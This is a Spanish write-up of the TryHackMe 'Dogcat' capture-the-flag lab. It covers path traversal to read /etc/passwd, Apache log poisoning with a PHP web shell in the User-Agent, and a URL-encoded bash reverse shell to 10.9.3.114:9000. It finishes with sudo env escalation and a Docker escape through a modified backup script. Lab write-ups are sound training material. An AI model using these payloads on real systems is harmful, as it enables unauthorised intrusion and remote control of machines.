---
title: Dogcat
description: Write Up de DogCat de la plataforma tryhackme
published: true
date: 2025-05-07T16:39:06.464Z
tags: 
editor: markdown
dateCreated: 2025-05-06T15:56:05.414Z
---

# Dogcat
Bienvenido a la documentación de la máquina Dogcat de la plataforma Hack The Box.
## Reconocimiento
Lo primero que vamos a hacer como siempre es usar nmap para hacer un reconocimiento de los puertos disponibles.

```
nmap -sS -sT -Pn {IP}
```

![Imagen del mapeo de Puertos](/imagenes/dogcat_1.png)

Como podemos observar, tenemos el puerto SSH y un puerto HTTP, vamos a ver que hay en la página web con nuestro navegador favorito.

![Primer vistazo del website](/imagenes/dogcat_2.png)

Parece ser que en el website, podemos decidir que queremos ver, sin embargo podemos observar como la URL se ha modificado y nos pasa un parámetro con el animal que queramos ver...

![Observación de la URL](/imagenes/dogcat_3.png)

Cuando modificamos los inputs, podemos ver una serie de errores, por lo que es posible intentar inyectar código o imágenes maliciosas para ganar acceso

![Errores en la URL](/imagenes/dogcat_4.png)

Si nos fijamos, automáticamente se rellena los parámetros con .php, por lo que se podría intentar hacer una inyección de código.

## Explotación
Vamos a hacer uso de &ext=

¿Qué es "&ext="? Es un parámetro que evita que se añadía .php, al archivo seleccionado, con ello podemos abrir un archivo sin necesidad de que siempre ponga .php, por ejemplo, podemos intentar abrir el /etc/passwd

Por ejemplo, podemos poner dog../../../../../etc/passwd&ext. 

![Forzar extensión](/imagenes/dogcat_5.png)

Y ha funcionado, esto nos da la pista de que podríamos incluso infectar archivos importantes, como access.log de apache2, provocando un log poisoning y con ello el acceso al equipo.


Para ello abriremos nuestro Burpsuite, ya que debemos modificar una serie de cosas. Lo que queremos hacer con Burp Suite es pasar como parámetro en User-Agent (Que se lee en el access.log, de Apache2) <?php system ($_GET['cmd']);?>

Con ello podemos empezar a haz log poisoning dentro del website

![Log Poisoning](/imágenes/dogcat_6.png)

Como resultado obtenemos

![Funciona!](/images/dogcat_7.png)

Ahora vamos a intentar hacer una shell reversa con [Revshells](https://www.revshells.com). En mi caso mi ip es la 10.9.3.114 con el puerto 9000. Sin embargo hay que tener en cuenta que deberemos pasarlo codificado en URL.

Como resultado es el lo siguiente: bash%20-c%20%27bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.9.3.114%2F9000%200%3E%261%27

![Shell establecida](/imagenes/dogcat_9.png)

Podemos comprobar en la shell que tengamos con el netcat, que tenemos la shell. Vamos a sanear la shell ponemos export TERM=xterm.

## Escalada
Ahora vamos a mirar qué comandos podemos ejecutar como root, para ello hacemos 
``` bash
sudo -l
```

![Escalada de root](/imagenes/dogcat_10.png)

Si nos dirigimos al website de [GTFOBins](https://gtfobins.github.io/gtfobins/env/#shell), podemos ver como hay una forma para obtener root mediante el sudo.


Las flags las tenemos:
- En el propio directorio /var/www/html:
![Primera flag](/imagenes/dogcat_11.png)
- En el directorio de /var/www:
![Segunda flag](/imagenes/dogcat_12.png)
- En el directorio de root:
![Tercera flag](/imagenes/dogcat_13.png)

La última está fuera de docker, debemos tener en cuenta que siempre que estamos en un docker. Se suele crear una carpeta en /opt o /mnt, donde tiene la información. En este caso lo ubicamos en el /opt

![Ir a /opt](/imagenes/dogcat_14.png)

Si miramos la carpeta podemos observar una serie de comandos, donde se hace un tar del contenedor entero.

![Lectura del comando](/imagenes/dogcat_15.png)

Podemos realizar una modificación donde añadimos para que establezca una conexión a nuestro equipo atacante por ejemplo:
![Modificar](/imagenes/dogcat_16.png)
Tras ejecutar el comando deberíamos ser root en la máquina anfitrión también.

Y podremos encontrar la última flag ahí.
![](/imagenes/dogcat_16.png)
